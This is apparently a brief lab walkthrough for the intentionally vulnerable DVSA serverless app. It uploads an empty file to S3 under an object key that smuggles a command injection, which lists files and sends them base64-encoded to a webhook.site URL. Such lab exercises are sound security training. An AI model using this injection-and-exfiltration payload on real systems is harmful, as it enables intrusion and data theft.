
Log into aws (aws_cli.png)


# 1. Create a tiny dummy file
New-Item -Path "empty.raw" -ItemType "File" -Force

# 2. Upload with the Injection Payload
# IMPORTANT: Replace [YOUR_WEBHOOK_ID] with the ID from your Webhook.site URL
aws s3 cp empty.raw 's3://dvsa-receipts-bucket-562825150177-us-east-1/2026/04/16/null_;curl https://webhook.site/[YOUR_WEBHOOK_ID]?data=$(ls|base64);echo x.raw' --acl public-read